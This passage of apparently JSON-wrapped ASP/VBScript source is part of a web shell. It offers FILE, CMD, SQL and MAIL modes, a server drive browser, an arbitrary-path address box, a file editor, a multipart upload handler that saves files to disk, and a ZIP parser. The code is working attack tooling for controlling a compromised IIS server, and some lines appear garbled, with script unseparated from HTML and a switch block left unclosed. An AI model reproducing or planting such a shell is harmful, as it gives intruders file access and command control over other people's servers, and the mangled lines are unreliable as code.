            "\t\tfrmFile.target = \"\";",
            "\t\tfrmFile.command.value = cmd",
            "\t\tfrmFile.submit();\t",
            "</script>",
            "end sub",
            "sub HtmlJsEditor()",
            "<script>",
            "\tfunction EditorCommand (cmd) {",
            "\t\tswitch (cmd) {",
            "\t\t\tcase \"WordWrap\":",
            "\t\t\t\tif (frmFile.wrap.checked) frmFile.content.wrap=\"soft\";",
            "\t\t\t\telse frmFile.content.wrap=\"off\";",
            "\t\t\t\tfrmFile.content.focus();",
            "\t\t\t\tbreak;",
            "\t\t\tcase \"Reload\":",
            "\t\t\t\tfrmFile.reset();",
            "\t\t\t\tbreak;",
            "\t\t\tcase \"Save\":",
            "\t\t\t\tfrmFile.subcommand.value = \"Save\";",
            "\t\t\t\tfrmFile.submit();",
            "\t\t\t\tbreak;",
            "\t\t\tcase \"SaveAs\":",
            "\t\t\t\tvar str, oldname;",
            "\t\t\t\toldname = frmFile.param.value;",
            "\t\t\t\tstr = prompt(\"Save the file as :\", oldname);",
            "\t\t\t\tif (!str || str==oldname) return;",
            "\t\t\t\tfrmFile.param.value = str;",
            "\t\t\t\tfrmFile.subcommand.value = \"SaveAs\";",
            "\t\t\t\tfrmFile.submit();",
            "\t\t\t\tbreak;",
            "</script>",
            "end sub",
            "sub HtmlQuick()",
            "<form name=frmQuick method=post action=\"<%=gURL%>\">",
            "<input type=hidden name=command value=OpenFolder>",
            "<select name=param onchange=\"frmQuick.submit()\">",
            "\tdim dc,d,dName,dType",
            "\tset dc=FSO.Drives",
            "\tfor each d in dc",
            "\t\tdName=d.DriveLetter&\":\\\"",
            "\t\tselect case d.DriveType",
            "\t\t\tcase 0 dType=\"Unknown\"",
            "\t\t\tcase 1 if d.driveletter=\"A\" then dType=\"&#189;\" else dType=\"&#188;\"",
            "\t\t\tdType=dType&\" Floppy\" 'maybe wrong",
            "\t\t\tcase 2 dType=\"HDD \" & FormatSize(d.TotalSize)",
            "\t\t\tcase 3 dType=\"Network\"",
            "\t\t\tcase 4",
            "\t\t\t\tdType=\"CD-ROM\"",
            "\t\t\t\tif not d.IsReady then dType=dType & \" - not ready\"",
            "\t\t\tcase 5",
            "\t\t\t\tdType=\"RAM Disk\"",
            "\t\tend select",
            "\t\tResponse.Write \"<option value=\"\"\" & dName & \"\"\"\"",
            "\t\tif d.DriveLetter=Ucase(Left(targetPath,1)) then Response.Write \" selected\"",
            "\t\tResponse.Write \">\" & dName& \" (\" & dType & \")\" & vbNewLine",
            "\tnext",
            "\tset dc=nothing",
            "</select>",
            "</form>",
            "<form name=frmAddress method=post action=\"<%=gURL%>\">",
            "<input type=hidden name=command value=OpenFolder>",
            "<b>A</b>ddress: <input type=text name=param value=\"<%=targetPath%>\" size=90> <input type=submit value=Go>",
            "</form>",
            "end sub",
            "sub HtmlMode()",
            "<table>",
            "<tr>",
            " <td>",
            "  <form name=frmChangeMode method=post action=\"<%=gURL%>\">",
            "  <input type=hidden name=command value=ChangeMode>",
            "  <select name=mode onchange=\"frmChangeMode.submit()\">",
            "   <option value=0<%if Session(\"mode\")=0 then Response.Write \" selected\"%>>FILE",
            "   <option value=1<%if Session(\"mode\")=1 then Response.Write \" selected\"%>>CMD",
            "   <option value=2<%if Session(\"mode\")=2 then Response.Write \" selected\"%>>SQL",
            "   <option value=3<%if Session(\"mode\")=3 then Response.Write \" selected\"%>>MAIL",
            "  </select>",
            "  </form>",
            " </td>",
            "\tif gPassword<>\"\" then",
            " <td>",
            "  <form name=frmLogout method=post action=\"<%=gURL%>\">",
            "  <input type=submit name=command value=Logout>",
            "  </form>",
            " </td>",
            "\tend if",
            "</tr>",
            "</table>",
            "end sub",
            "'###########################################################################################",
            "sub HtmlHeader(strTitle)",
            "<html>",
            "<head>",
            "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">",
            "<title><%=strTitle%></title>",
            "<style>",
            "select,input{font-family:Verdana;font-size:9pt}",
            "</style>",
            "</head>",
            "<body>",
            "end sub",
            "'###########################################################################################",
            "sub HtmlFooter()",
            "</body>",
            "</html>",
            "end sub",
            "'###########################################################################################",
            "function abspath(path)",
            "\tif left(path,1)=\":\" then abspath=Server.MapPath(mid(path,2)) else abspath=FSO.GetAbsolutePathName(path)",
            "end function",
            "'###########################################################################################",
            "function addslash(path)",
            "\tif right(path,1)=\"\\\" then addslash=path else addslash=path & \"\\\"",
            "end function",
            "'###########################################################################################",
            "function findroot(path)",
            "\tdim f",
            "\tset f=FSO.GetFolder(path)",
            "\tif f.IsRootFolder then",
            "\telse",
            "\t\tdo until f.IsRootFolder",
            "\t\t\tset f=f.ParentFolder",
            "\t\tloop",
            "\tend if",
            "\tfindroot=f.Path",
            "\tset f=nothing",
            "end function",
            "'###########################################################################################",
            "function isroot(path)",
            "\tdim f",
            "\tset f=FSO.GetFolder(path)",
            "\tisroot=f.IsRootFolder",
            "\tset f=nothing",
            "end function",
            "'###########################################################################################",
            "Function FindLink(szFileName)",
            "\tDim WshShell, oLink",
            "\tSet WshShell=Server.CreateObject(\"WScript.Shell\")",
            "\tSet oLink=WshShell.CreateShortcut(szFileName)",
            "\tFindLink=oLink.TargetPath",
            "\tSet oLink=Nothing",
            "\tSet WshShell=Nothing",
            "End Function",
            "'###########################################################################################",
            "Function FormatSize(intSize)",
            "\tIf (intSize < 1024) Then",
            "\t\tFormatSize = intSize & \" B\"",
            "\tElseIf (intSize < 1024*1024) Then",
            "\t\tFormatSize = FormatNumber(intSize/1024,2) & \" KB\"",
            "\tElseIf (intSize < 1024*1024*1024) Then",
            "\t\tFormatSize = FormatNumber(intSize/(1024*1024),2) & \" MB\"",
            "\tElse",
            "\t\tFormatSize = FormatNumber(intSize/(1024*1024*1024),2) & \" GB\"",
            "\tEnd If",
            "End Function",
            "'###########################################################################################",
            "Function FormatName(szName)",
            "\tFormatName = szName",
            "\tIf gMax > 5 And Len(szName) > gMax Then FormatName = Left(szName,gMax-2) & \"...\"",
            "End Function",
            "'###########################################################################################",
            "function FormatDate(strDate)",
            "\tdim int12HourPart,strAMPM",
            "\tint12HourPart=DatePart(\"h\",strDate) mod 12",
            "\tif int12HourPart=0 then int12HourPart=12",
            "\tif DatePart(\"h\",strDate)>=12 then strAMPM=\"PM\" else strAMPM=\"AM\"",
            "\tFormatDate=Right(\"0\"&DatePart(\"d\",strDate),2) & \"/\" & Right(\"0\"&DatePart(\"m\",strDate),2) & \"/\" & DatePart(\"yyyy\",strDate) & \" \" &  Right(\"0\"&int12HourPart,2) & \":\" & Right(\"0\"&DatePart(\"n\",strDate),2) & \":\" & Right(\"0\"&DatePart(\"s\",strDate),2) & \" \" & strAMPM",
            "end function",
            "'###########################################################################################",
            "Function GetAttributes(intAttr)",
            "\tDim strAttributes",
            "\tstrAttributes=\"\"",
            "\tIf (intAttr And 1) > 0 Then strAttributes = \"R\"",
            "\tIf (intAttr And 2) > 0 Then strAttributes=strAttributes & \"H\"",
            "\tIf (intAttr And 4) > 0 Then strAttributes=strAttributes & \"S\"",
            "\tIf (intAttr And 32) > 0 Then strAttributes=strAttributes & \"A\"",
            "\tIf (intAttr And 2048) > 0 Then strAttributes=strAttributes & \"C\"",
            "\tif strAttributes=\"\" then strAttributes=\"&nbsp;\"",
            "\tGetAttributes=strAttributes",
            "End Function",
            "'###########################################################################################",
            "Class clsField",
            "\tPublic Name",
            "\tPrivate mstrPath",
            "\tPublic FileDir",
            "\tPublic FileExt",
            "\tPublic FileName",
            "\tPublic ContentType",
            "\tPublic Value",
            "\tPublic BinaryData",
            "\tPublic Length",
            "\tPrivate mstrText",
            "\tPublic Property Get BLOB()",
            "\t\tBLOB = BinaryData",
            "\tEnd Property",
            "\tPublic Function BinaryAsText()",
            "\t\tDim lbinBytes",
            "\t\tDim lobjRs",
            "\t\tIf Length = 0 Then Exit Function",
            "\t\tIf LenB(BinaryData) = 0 Then Exit Function",
            "\t\tIf Not Len(mstrText) = 0 Then",
            "\t\t\tBinaryAsText = mstrText",
            "\t\t\tExit Function",
            "\t\tEnd If",
            "\t\tlbinBytes = ASCII2Bytes(BinaryData)",
            "   \t\tmstrText = Bytes2Unicode(lbinBytes)",
            "    \tBinaryAsText = mstrText",
            "\tEnd Function",
            "\tPublic Sub SaveAs(ByRef pstrFileName)",
            "\t\tConst adTypeBinary=1",
            "\t\tConst adSaveCreateOverWrite=2",
            "\t\tDim lobjStream",
            "\t\tDim lobjRs",
            "\t\tDim lbinBytes",
            "\t\tIf Length = 0 Then Exit Sub",
            "\t\tIf LenB(BinaryData) = 0 Then Exit Sub",
            "\t\tSet lobjStream = Server.CreateObject(\"ADODB.Stream\")",
            "\t\tlobjStream.Type = adTypeBinary",
            "\t\tCall lobjStream.Open()",
            "\t\tlbinBytes = ASCII2Bytes(BinaryData)",
            "\t\tCall lobjStream.Write(lbinBytes)",
            "\t\tOn Error Resume Next",
            "\t\tCall lobjStream.SaveToFile(pstrFileName, adSaveCreateOverWrite)",
            "\t\tCall lobjStream.Close()",
            "\t\tSet lobjStream = Nothing",
            "\tEnd Sub",
            "\tPublic Property Let FilePath(ByRef pstrPath)",
            "\t\tmstrPath = pstrPath",
            "\t\tIf Not InStrRev(pstrPath, \".\") = 0 Then",
            "\t\t\tFileExt = Mid(pstrPath, InStrRev(pstrPath, \".\") + 1)",
            "\t\t\tFileExt = UCase(FileExt)",
            "\t\tEnd If",
            "\t\tIf Not InStrRev(pstrPath, \"\\\") = 0 Then",
            "\t\t\tFileName = Mid(pstrPath, InStrRev(pstrPath, \"\\\") + 1)",
            "\t\tEnd If",
            "\t\tIf Not InStrRev(pstrPath, \"\\\") = 0 Then",
            "\t\t\tFileDir = Mid(pstrPath, 1, InStrRev(pstrPath, \"\\\") - 1)",
            "\t\tEnd If",
            "\tEnd Property",
            "\tPublic Property Get FilePath()",
            "\t\tFilePath = mstrPath",
            "\tEnd Property",
            "\tPrivate Function ASCII2Bytes(ByRef pbinBinaryData)",
            "\t\tConst adLongVarBinary=205",
            "\t\tDim lobjRs",
            "\t\tDim llngLength",
            "\t\tDim lbinBuffer",
            "\t\tllngLength = LenB(pbinBinaryData)",
            "\t\tSet lobjRs = Server.CreateObject(\"ADODB.Recordset\")",
            "\t\tCall lobjRs.Fields.Append(\"BinaryData\", adLongVarBinary, llngLength)",
            "\t\tCall lobjRs.Open()",
            "\t\tCall lobjRs.AddNew()",
            "\t\tCall lobjRs.Fields(\"BinaryData\").AppendChunk(pbinBinaryData & ChrB(0))",
            "\t\tCall lobjRs.Update()",
            "\t\tlbinBuffer = lobjRs.Fields(\"BinaryData\").GetChunk(llngLength)",
            "\t\tCall lobjRs.Close()",
            "\t\tSet lobjRs = Nothing",
            "\t\tASCII2Bytes = lbinBuffer",
            "\tEnd Function",
            "\tPrivate Function Bytes2Unicode(ByRef pbinBytes)",
            "\t\tDim lobjRs",
            "\t\tDim llngLength",
            "\t\tDim lstrBuffer",
            "\t\tllngLength = LenB(pbinBytes)",
            "\t\tSet lobjRs = Server.CreateObject(\"ADODB.Recordset\")",
            "    \tCall lobjRs.Fields.Append(\"BinaryData\", adLongVarChar, llngLength)",
            "    \tCall lobjRs.Open()",
            "    \tCall lobjRs.AddNew()",
            "    \tCall lobjRs.Fields(\"BinaryData\").AppendChunk(pbinBytes)",
            "    \tCall lobjRs.Update()",
            "    \tlstrBuffer = lobjRs.Fields(\"BinaryData\").Value",
            "    \tCall lobjRs.Close()",
            "    \tSet lobjRs = Nothing",
            "\t\tBytes2Unicode = lstrBuffer",
            "\tEnd Function",
            "End Class",
            "'###########################################################################################",
            "Class clsUpload",
            "\tPrivate mbinData",
            "\tPrivate mlngChunkIndex",
            "\tPrivate mlngBytesReceived",
            "\tPrivate mstrDelimiter",
            "\tPrivate CR",
            "\tPrivate LF",
            "\tPrivate CRLF",
            "\tPrivate mobjFieldAry()",
            "\tPrivate mlngCount",
            "\tPrivate Sub RequestData",
            "\t\tDim llngLength",
            "\t\tmlngBytesReceived = Request.TotalBytes",
            "\t\tmbinData = Request.BinaryRead(mlngBytesReceived)",
            "\tEnd Sub",
            "\tPrivate Sub ParseDelimiter()",
            "\t\tmstrDelimiter = MidB(mbinData, 1, InStrB(1, mbinData, CRLF) - 1)",
            "\tEnd Sub",
            "\tPrivate Sub ParseData()",
            "\t\tDim llngStart",
            "\t\tDim llngLength",
            "\t\tDim llngEnd",
            "\t\tDim lbinChunk",
            "\t\tllngStart = 1",
            "\t\tllngStart = InStrB(llngStart, mbinData, mstrDelimiter & CRLF)",
            "\t\tWhile Not llngStart = 0",
            "\t\t\tllngEnd = InStrB(llngStart + 1, mbinData, mstrDelimiter) - 2",
            "\t\t\tllngLength = llngEnd - llngStart",
            "\t\t\tlbinChunk = MidB(mbinData, llngStart, llngLength)",
            "\t\t\tCall ParseChunk(lbinChunk)",
            "\t\t\tllngStart = InStrB(llngStart + 1, mbinData, mstrDelimiter & CRLF)",
            "\t\tWend",
            "\tEnd Sub",
            "\tPrivate Sub ParseChunk(ByRef pbinChunk)",
            "\t\tDim lstrName",
            "\t\tDim lstrFileName",
            "\t\tDim lstrContentType",
            "\t\tDim lbinData",
            "\t\tDim lstrDisposition",
            "\t\tDim lstrValue",
            "\t\tlstrDisposition = ParseDisposition(pbinChunk)",
            "\t\tlstrName = ParseName(lstrDisposition)",
            "\t\tlstrFileName = ParseFileName(lstrDisposition)",
            "\t\tlstrContentType = ParseContentType(pbinChunk)",
            "\t\tIf lstrContentType = \"\" Then",
            "\t\t\tlstrValue = CStrU(ParseBinaryData(pbinChunk))",
            "\t\tElse",
            "\t\t\tlbinData = ParseBinaryData(pbinChunk)",
            "\t\tEnd If",
            "\t\tCall AddField(lstrName, lstrFileName, lstrContentType, lstrValue, lbinData)",
            "\tEnd Sub",
            "\tPrivate Sub AddField(ByRef pstrName, ByRef pstrFileName, ByRef pstrContentType, ByRef pstrValue, ByRef pbinData)",
            "\t\tDim lobjField",
            "\t\tReDim Preserve mobjFieldAry(mlngCount)",
            "\t\tSet lobjField = New clsField",
            "\t\tlobjField.Name = pstrName",
            "\t\tlobjField.FilePath = pstrFileName\t\t\t\t",
            "\t\tlobjField.ContentType = pstrContentType",
            "\t\tIf LenB(pbinData) = 0 Then",
            "\t\t\tlobjField.BinaryData = ChrB(0)",
            "\t\t\tlobjField.Value = pstrValue",
            "\t\t\tlobjField.Length = Len(pstrValue)",
            "\t\tElse",
            "\t\t\tlobjField.BinaryData = pbinData",
            "\t\t\tlobjField.Length = LenB(pbinData)",
            "\t\t\tlobjField.Value = \"\"",
            "\t\tEnd If",
            "\t\tSet mobjFieldAry(mlngCount) = lobjField",
            "\t\tmlngCount = mlngCount + 1",
            "\tEnd Sub",
            "\tPrivate Function ParseBinaryData(ByRef pbinChunk)",
            "\t\tDim llngStart",
            "\t\tllngStart = InStrB(1, pbinChunk, CRLF & CRLF)",
            "\t\tIf llngStart = 0 Then Exit Function",
            "\t\tllngStart = llngStart + 4",
            "\t\tParseBinaryData = MidB(pbinChunk, llngStart)",
            "\tEnd Function",
            "\tPrivate Function ParseContentType(ByRef pbinChunk)",
            "\t\tDim llngStart",
            "\t\tDim llngEnd",
            "\t\tDim llngLength",
            "\t\tllngStart = InStrB(1, pbinChunk, CRLF & CStrB(\"Content-Type:\"), vbTextCompare)",
            "\t\tIf llngStart = 0 Then Exit Function",
            "\t\tllngEnd = InStrB(llngStart + 15, pbinChunk, CR)",
            "\t\tIf llngEnd = 0 Then Exit Function",
            "\t\tllngStart = llngStart + 15",
            "\t\tIf llngStart >= llngEnd Then Exit Function",
            "\t\tllngLength = llngEnd - llngStart",
            "\t\tParseContentType = Trim(CStrU(MidB(pbinChunk, llngStart, llngLength)))",
            "\tEnd Function",
            "\tPrivate Function ParseDisposition(ByRef pbinChunk)",
            "\t\tDim llngStart",
            "\t\tDim llngEnd",
            "\t\tDim llngLength",
            "\t\tllngStart = InStrB(1, pbinChunk, CRLF & CStrB(\"Content-Disposition:\"), vbTextCompare)",
            "\t\tIf llngStart = 0 Then Exit Function",
            "\t\tllngEnd = InStrB(llngStart + 22, pbinChunk, CRLF)",
            "\t\tIf llngEnd = 0 Then Exit Function",
            "\t\tllngStart = llngStart + 22",
            "\t\tIf llngStart >= llngEnd Then Exit Function",
            "\t\tllngLength = llngEnd - llngStart",
            "\t\tParseDisposition = CStrU(MidB(pbinChunk, llngStart, llngLength))",
            "\tEnd Function",
            "\tPrivate Function ParseName(ByRef pstrDisposition)",
            "\t\tDim llngStart",
            "\t\tDim llngEnd",
            "\t\tDim llngLength",
            "\t\tllngStart = InStr(1, pstrDisposition, \"name=\"\"\", vbTextCompare)",
            "\t\tIf llngStart = 0 Then Exit Function",
            "\t\tllngEnd = InStr(llngStart + 6, pstrDisposition, \"\"\"\")",
            "\t\tIf llngEnd = 0 Then Exit Function",
            "\t\tllngStart = llngStart + 6",
            "\t\tIf llngStart >= llngEnd Then Exit Function",
            "\t\tllngLength = llngEnd - llngStart",
            "\t\tParseName = Mid(pstrDisposition, llngStart, llngLength)",
            "\tEnd Function",
            "' ------------------------------------------------------------------------------",
            "\tPrivate Function ParseFileName(ByRef pstrDisposition)",
            "\t\tDim llngStart",
            "\t\tDim llngEnd",
            "\t\tDim llngLength",
            "\t\tllngStart = InStr(1, pstrDisposition, \"filename=\"\"\", vbTextCompare)",
            "\t\tIf llngStart = 0 Then Exit Function",
            "\t\tllngEnd = InStr(llngStart + 10, pstrDisposition, \"\"\"\")",
            "\t\tIf llngEnd = 0 Then Exit Function",
            "\t\tllngStart = llngStart + 10",
            "\t\tIf llngStart >= llngEnd Then Exit Function",
            "\t\tllngLength = llngEnd - llngStart",
            "\t\tParseFileName = Mid(pstrDisposition, llngStart, llngLength)",
            "\tEnd Function",
            "\tPublic Property Get Count()",
            "\t\tCount = mlngCount",
            "\tEnd Property",
            "\tPublic Default Property Get Fields(ByVal pstrName)",
            "\t\tDim llngIndex",
            "\t\tIf IsNumeric(pstrName) Then",
            "\t\t\tllngIndex = CLng(pstrName)",
            "\t\t\tIf llngIndex > mlngCount - 1 Or llngIndex < 0 Then",
            "\t\t\t\tCall Err.Raise(vbObjectError + 1, \"clsUpload.asp\", \"Object does not exist within the ordinal reference.\")",
            "\t\t\t\tExit Property",
            "\t\t\tEnd If",
            "\t\t\tSet Fields = mobjFieldAry(pstrName)",
            "\t\tElse",
            "\t\t\tpstrName = LCase(pstrname)",
            "\t\t\tFor llngIndex = 0 To mlngCount - 1",
            "\t\t\t\tIf LCase(mobjFieldAry(llngIndex).Name) = pstrName Then",
            "\t\t\t\t\tSet Fields = mobjFieldAry(llngIndex)",
            "\t\t\t\t\tExit Property",
            "\t\t\t\tEnd If",
            "\t\t\tNext",
            "\t\tEnd If",
            "\t\tSet Fields = New clsField",
            "\tEnd Property",
            "\tPrivate Sub Class_Terminate()",
            "\t\tDim llngIndex",
            "\t\tFor llngIndex = 0 To mlngCount - 1",
            "\t\t\tSet mobjFieldAry(llngIndex) = Nothing",
            "\t\tNext",
            "\t\tReDim mobjFieldAry(-1)",
            "\tEnd Sub",
            "\tPrivate Sub Class_Initialize()",
            "\t\tReDim mobjFieldAry(-1)",
            "\t\tCR = ChrB(Asc(vbCr))",
            "\t\tLF = ChrB(Asc(vbLf))",
            "\t\tCRLF = CR & LF",
            "\t\tmlngCount = 0",
            "\t\tCall RequestData",
            "\t\tCall ParseDelimiter()",
            "\t\tCall ParseData",
            "\tEnd Sub",
            "\tPrivate Function CStrU(ByRef pstrANSI)",
            "\t\tDim llngLength",
            "\t\tDim llngIndex",
            "\t\tllngLength = LenB(pstrANSI)",
            "\t\tFor llngIndex = 1 To llngLength",
            "\t\t\tCStrU = CStrU & Chr(AscB(MidB(pstrANSI, llngIndex, 1)))",
            "\t\tNext",
            "\tEnd Function",
            "\tPrivate Function CStrB(ByRef pstrUnicode)",
            "\t\tDim llngLength",
            "\t\tDim llngIndex",
            "\t\tllngLength = Len(pstrUnicode)",
            "\t\tFor llngIndex = 1 To llngLength",
            "\t\t\tCStrB = CStrB & ChrB(Asc(Mid(pstrUnicode, llngIndex, 1)))",
            "\t\tNext",
            "\tEnd Function",
            "End Class",
            "'###########################################################################################",
            "Class clsZip",
            "\tPrivate mbin_Zip",
            "\tPrivate mobj_Files()",
            "\tPrivate mlng_Files",
            "\tSub ZipLoad(pstrFileName)",
            "\t\tDim lobjFSO",
            "\t\tDim llngTristateFalse",
            "\t\tDim llngForReading",
            "\t\tdim objStream",
            "\t\tmbin_Zip = \"\"",
            "\t\tIf pstrFileName = \"\" Then Exit Sub",
            "\t\tIf InStr(1, pstrFileName, \":\\\") = 0 Then",
            "\t\t\tpstrFileName = Server.MapPath(pstrFileName)",
            "\t\tEnd If",
            "\t\tSet lobjFSO = Server.CreateObject(\"Scripting.FileSystemObject\")",
            "\t\tIf lobjFSO.FileExists(pstrFileName) Then",
            "\t\t\tset objStream=Server.CreateObject(\"ADODB.Stream\")",
            "\t\t\tobjStream.Type=1",
            "\t\t\tobjStream.Open",
            "\t\t\ton error resume next",
            "\t\t\tobjStream.LoadFromFile(pstrFileName)",
            "\t\t\tmbin_Zip = objStream.Read",
            "\t\t\tset objStream=nothing",
            "\t\tEnd If",
            "\t\tSet lobjFSO = Nothing",
            "\t\tCall ParseZips()",
            "\tEnd Sub",
            "\tPublic Property Let ZipData(ByRef pbinBinaryData)",
            "\t\tmbin_Zip = pbinBinaryData",
            "\t\tCall ParseZips()",
            "\tEnd Property",
            "\tPublic Property Get FileCount()",
            "\t\tFileCount = mlng_Files",
            "\tEnd Property",
            "\tPublic Property Get GetFile(ByRef plngIndex)",
            "\t\tSet GetFile = mobj_Files(plngIndex-1)",
            "\tEnd Property",
            "\tPrivate Sub ParseZips()",
            "\t\tDim llngOffSet",
            "\t\tmlng_Files = 0",
            "\t\tllngOffSet = 0",
            "\t\tIf LenB(mbin_Zip) = 0 Then Exit Sub",
            "\t\tDo",
            "\t\t\t' Find next PK 3.04 record",
            "\t\t\tllngOffset = InStrB(llngOffset + 1, mbin_zip, ChrB(&h50) & ChrB(&h4B) & ChrB(&h03) & ChrB(&h04))",
            "\t\t\tIf llngOffset = 0 Then Exit Do",
            "\t\t\tllngOffset = llngOffset - 1",
            "\t\t\tReDim Preserve mobj_Files(mlng_Files)",
            "\t\t\tSet mobj_Files(mlng_Files) = New clsZipFile",
            "\t\t\tWith mobj_Files(mlng_Files)",
            "\t\t\t\t.Signature\t\t\t\t= GetString(llngOffset + 1, 2) & \" \" & CInt(GetHex(llngOffset + 3, 1)) & \".\" & GetHex(llngOffset + 4, 1)",
            "\t\t\t\t.ExtractVersion\t\t\t= FormatNumber(GetNumber(llngOffset + 5, 2) * .1, 1, True)",
            "\t\t\t\t.GeneralPurposeFlags\t= GetNumber(llngOffset + 7, 2)",
            "\t\t\t\t.CompressionMethod\t\t= GetNumber(llngOffset + 9, 2)",
            "\t\t\t\t.LastModifiedTime\t\t= GetNumber(llngOffset + 11, 2)",
            "\t\t\t\t.LastModifiedDate\t\t= GetNumber(llngOffset + 13, 2)",
            "\t\t\t\t.CRC32\t\t\t\t\t= GetNumber(llngOffset + 15, 4)",
            "\t\t\t\t.CompressedSize\t\t\t= GetNumber(llngOffset + 19, 4)",
            "\t\t\t\t.UncompressedSize\t\t= GetNumber(llngOffset + 23, 4)",
            "\t\t\t\t.FileNameLength\t\t\t= GetNumber(llngOffset + 27, 2)",
            "\t\t\t\t.ExtraFieldLength\t\t= GetNumber(llngOffset + 29, 2)",
            "\t\t\t\t.FileName\t\t\t\t= GetString(llngOffset + 31, .FileNameLength)",
            "\t\t\t\t.ExtraField\t\t\t\t= GetString(llngOffset + 31 + .FileNameLength, .ExtraFieldLength)",
            "\t\t\t\t.StartByte\t\t\t\t= llngOffSet + 1",
            "\t\t\t\t.EndByte\t\t\t\t= llngOffSET + .FileNameLength + .ExtraFieldLength + .CompressedSize + 30",
            "'\t\t\t\t.BinaryData\t\t\t\t= MidB(pbin_Zip, llngOffSET + .FileNameLength + .ExtraFieldLength + 30, .CompressedSize)",
            "'\t\t\t\t.LocalFileHeader\t\t= GetString(llngOffset + 1, .FileNameLength + .ExtraFieldLength + 30)",
            "\t\t\t\tllngOffSet\t\t\t\t= .EndByte",
            "\t\t\t\t.IsOverall\t\t\t\t= (.Name = \"\" And .Path = \"\")",
            "\t\t\t\t.IsFolder\t\t\t\t= (.Name = \"\" And Not .Path = \"\")",
            "\t\t\tEnd With",
            "\t\t\tmlng_Files = mlng_Files + 1",
            "\t\tLoop While mobj_Files(mlng_Files - 1).EndByte < LenB(mbin_zip)",
            "\tEnd Sub",
            "\tPrivate Function GetHex(plngStart, plngLength)",
            "\t\tDim llngIndex",
            "\t\tDim lstrHex",
            "\t\tFor llngIndex = 0 To plngLength - 1",
            "\t\t\tlstrHex = lstrHex & Right(\"0\" & Hex(AscB(MidB(mbin_zip, plngStart + llngIndex, 1))), 2)",
            "\t\tNext",
            "\t\tGetHex = lstrHex",
            "\tEnd Function",
            "\tPrivate Function GetString(plngStart, plngLength)",
            "\t\tDim llngIndex",
            "\t\tDim lstrString",
            "\t\tIf LenB(mbin_zip) < (plngStart + (plngLength - 1)) Then Exit Function",
            "\t\tFor llngIndex = 0 To plngLength - 1",
            "\t\t\tIf AscB(MidB(mbin_zip, plngStart + llngIndex, 1)) = 0 Then",
            "\t\t\t\tlstrString = lstrString & \" \"",
            "\t\t\tElse",
            "\t\t\t\tlstrString = lstrString & Chr(AscB(MidB(mbin_zip, plngStart + llngIndex, 1)))",
            "\t\t\tEnd If",
            "\t\tNext",
            "\t\tGetString = lstrString",
            "\tEnd Function",
            "\tPrivate Function GetNumber(plngStart, plngLength)",
            "\t\tIf plngStart < 0 Then Exit Function",
            "\t\tDim llngIndex",
            "\t\tDim lstrHex",
            "\t\tFor llngIndex = 0 To plngLength - 1",
            "\t\t\tlstrHex = Right(\"0\" & Hex(AscB(MidB(mbin_zip, plngStart + llngIndex, 1))), 2) & lstrHex",
            "\t\tNext",
            "\t\tGetNumber = CDbl(\"&h\" & lstrHex)",
            "\tEnd Function",
            "\tFunction GetDate(plngStart)",
            "\t\tDim llngDate",
            "\t\tllngDate = GetNumber(plngStart, 2)",
            "\t\tGetDate = DateSerial(1980 + (llngDate And &HFE00) \\ &H200, (llngDate And &H1E0) \\ &H20, llngDate And &H1F)",
            "\tEnd Function",
            "\tFunction GetTime(plngStart)",
            "\t\tDim llngDate",
            "\t\tllngDate = GetNumber(plngStart, 2)",
            "\t\tGetTime = TimeSerial((llngDate And &HF800) \\ &H800, (llngDate And &H7E0) \\ &H20, (llngDate And &H1F) * 2)",
            "\tEnd Function",
            "End Class",
            "Class clsZipFile",
            "\tPublic Signature",
            "\tPublic ExtractVersion",
            "\tPublic GeneralPurposeFlags",
            "\tPublic CompressionMethod",
            "\tPublic LastModifiedTime",
            "\tPublic LastModifiedDate",
            "\tPublic CRC32",
            "\tPublic CompressedSize",
            "\tPublic UncompressedSize",
            "\tPublic FileNameLength",
            "\tPublic ExtraFieldLength",
            "\tPublic FileName",
            "\tPublic ExtraField",
            "\tPublic StartByte",
            "\tPublic EndByte",
            "\tPublic BinaryData",
            "\tPublic LocalFileHeader",
            "\tPublic IsFolder",
            "\tPublic IsOverall",
            "\tPublic Property Get Name",
            "\t\tDim lstrPath",
            "\t\tlstrPath = Replace(FileName, \"/\", \"\\\")",
            "\t\tIf InStr(1, lstrPath, \"\\\") = \"0\" Then",
            "\t\t\tName = lstrPath",
            "\t\t\tExit Property",
            "\t\tEnd If",
            "\t\tName = Mid(lstrPath, InStrRev(lstrPath, \"\\\") + 1)",
            "\tEnd Property",
            "\tPublic Property Get Path",
            "\t\tDim lstrPath",
            "\t\tlstrPath = Replace(FileName, \"/\", \"\\\")",
            "\t\tIf InStr(1, lstrPath, \"\\\") = \"0\" Then",
            "\t\t\tPath = \"\"",
            "\t\t\tExit Property",
            "\t\tEnd If",
            "\t\tPath = Mid(lstrPath, 1, InStrRev(lstrPath, \"\\\"))",
            "\tEnd Property",
            "\tPublic Property Get Packed",
            "\t\tPacked = CompressedSize",
            "\tEnd Property",
            "\tPublic Property Get Ratio",
            "\t\tIf UncompressedSize = 0 Then Exit Property",
            "\t\tIf CompressedSize >= UncompressedSize Then",
            "\t\t\tRatio = \"0%\"",
            "\t\tElse",
            "\t\t\tRatio = FormatNumber(((1 - (CompressedSize / UncompressedSize)) * 100), 0, True, False, True) & \"%\"",
            "\t\tEnd If",
            "\tEnd Property",
            "\tPublic Property Get Modified()",
            "\t\tModified = CDate(GetDate(LastModifiedDate) & \" \" & GetTime(LastModifiedTime))",
            "\tEnd Property",
            "\tPrivate Function GetDate(plngDate)",
            "\t\tGetDate = DateSerial(1980 + (plngDate And &HFE00) \\ &H200, _",
            "\t\t\t(plngDate And &H1E0) \\ &H20, plngDate And &H1F)",
            "\tEnd Function",
            "\tPrivate Function GetTime(plngDate)",
            "\t\tGetTime = TimeSerial((plngDate And &HF800) \\ &H800, _",
            "\t\t\t(plngDate And &H7E0) \\ &H20, _",
            "\t\t\t(plngDate And &H1F) * 2)",
            "\tEnd Function",
            "\tPublic Property Get Size()",
            "\t\tSize = UncompressedSize",
            "\tEnd Property",
            "\tPublic Property Get BitMask()",
            "\t\tDim llngNumber",
            "\t\tDim lstrBits",
            "\t\tllngNumber = GeneralPurposeFlags",
            "\t\tDo",
            "\t\t\tIf llngNumber Mod 2 = 1 Then lstrBits = \"1\" & lstrBits Else lstrBits = \"0\" & lstrBits",
            "\t\t\tllngNumber = llngNumber \\ 2",
            "\t\tLoop Until llngNumber = 0",
            "\t\tlstrBits = Right(\"0000000000000000\" & lstrBits, 16)",
            "\t\tFor llngNumber = 0 To 3",
